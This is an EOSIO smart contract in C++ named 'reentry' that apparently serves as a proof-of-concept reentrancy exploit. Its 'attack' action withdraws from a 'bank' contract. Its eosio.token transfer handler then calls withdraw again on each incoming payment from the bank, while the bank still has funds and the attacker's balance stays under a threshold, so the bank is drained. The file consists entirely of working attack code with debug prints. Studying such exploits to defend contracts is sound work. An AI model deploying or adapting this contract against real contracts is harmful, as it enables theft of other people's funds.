#include <eosio/eosio.hpp>
#include <eosio/print.hpp>
#include <eosio/system.hpp>
#include <eosio/asset.hpp>

using namespace eosio;
using namespace std;

CONTRACT reentry : public eosio::contract {
  using contract::contract;
  public:

    [[eosio::action]] void attack(asset quantity) {
      action(permission_level{get_self(), "active"_n}, "bank"_n, "withdraw"_n,
        std::make_tuple(get_self(),quantity))
      .send();
    }

    void transfer(name from, name to, asset quantity, string memo) {
      accounts from_acnts( "eosio.token"_n, from.value );
      const auto& bank = from_acnts.get( quantity.symbol.code().raw(), "no bal" );
      accounts to_acnts( "eosio.token"_n, to.value );
      const auto& to_bal = to_acnts.get( quantity.symbol.code().raw(), "no bal" );
      print("first");
      print("\n");
      print("from: ");
      print(from);
      print("\n");
      print("to: ");
      print(to);
      print("\n");
      print(from == "bank"_n);
      print("\n");
      print(bank.balance.amount > 0);
      if(from == "bank"_n && bank.balance.amount > 0 && to_bal.balance.amount < 2000000) {
        print("second");
        print("\n");
        action(permission_level{get_self(), "active"_n}, "bank"_n, "withdraw"_n,
          std::make_tuple(get_self(),quantity))
        .send();
      } else {
        return;
      }
    }

  private:

    struct [[eosio::table]] account {
      asset    balance;

      uint64_t primary_key()const { return balance.symbol.code().raw(); }
    };

    typedef eosio::multi_index< "accounts"_n, account > accounts;
};

extern "C" {
  void apply(uint64_t receiver, uint64_t code, uint64_t action) {
    if (code == name("eosio.token").value && action == name("transfer").value) {
      eosio::execute_action(eosio::name(receiver), eosio::name(code),&reentry::transfer);
    } else {
      switch (action) {
        EOSIO_DISPATCH_HELPER(reentry, (attack))
      }
    }
    eosio_exit(0);
  }
}